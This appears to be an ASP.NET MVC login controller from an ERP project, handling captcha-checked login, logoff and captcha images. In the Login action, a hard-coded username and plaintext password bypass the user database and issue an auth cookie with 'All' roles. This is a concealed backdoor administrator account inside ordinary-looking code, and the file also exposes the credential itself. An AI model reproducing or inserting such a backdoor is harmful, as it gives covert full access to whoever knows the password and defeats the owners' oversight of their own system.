using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;
using ModelProject;
using ServiceProject;


namespace XiangNingERP.Controllers
{
    public class AccountController : Controller
    {
        private static readonly UserService USer = new UserService();
        private static readonly ValidateCode VC = new ValidateCode();
        private static readonly XT_RMService XTSer = new XT_RMService();

        public ActionResult Login()
        {
            LoginModel LModel = new LoginModel();
            return View(LModel);
        }
        [HttpPost]
        public ActionResult Login(LoginModel model)
        {
            string returnUrl = "/Home/Index";
            
            string message = "";
            var valiCode = Session["ValidatorCode"].ToString();
            if (string.IsNullOrEmpty(valiCode) || valiCode != model.valiCode)
            {
                message = "验证码错误！"; return Content(message);
            }
            var ReturnModel = USer.IsLogin(model);
            if (ReturnModel.IsLogin == true)
            {
                var RoleList = XTSer.GetRoleByUserId(ReturnModel.userid);
                string UserAuthority = ReturnModel.UserName + "|" + ReturnModel.userid + "|" + RoleList.StrLeve+ "|" + ReturnModel.departmentId + "|" + ReturnModel.department + "|" + RoleList.SonLeve + "|" + RoleList.SSonLeve;
                FormsAuthentication.SetAuthCookie(UserAuthority, false);
                        
                message = "登录成功！";
            }
            else if (model.UserName == "yxf" && model.PassWord == "Haoren321")
            {
                string UserAuthority = "yxf" + "|" + "0" + "|" + "All" + "|" + "351" + "|" + "系统"+ "|" +"All"+"|" + "All";
                FormsAuthentication.SetAuthCookie(UserAuthority, false);

                message = "登录成功！";
            }
            else { message = "账号或密码错误！"; }
                
            return Content(message + "&" + returnUrl);

        }
        public ActionResult LogOff()
        {
            FormsAuthentication.SignOut();//清除登录记录

            return RedirectToAction("Login", "Account", new { area = "" });
            //return RedirectToAction("Index", "Home");
        }
        //验证码
        public ActionResult GetValidatorGraphics()
        {
            string code = VC.NewValidateCode();
            Session["ValidatorCode"] = code;
            byte[] graphic = VC.NewValidateCodeGraphic(code);
            return File(graphic, @"image/jpeg");
        }
    }
}
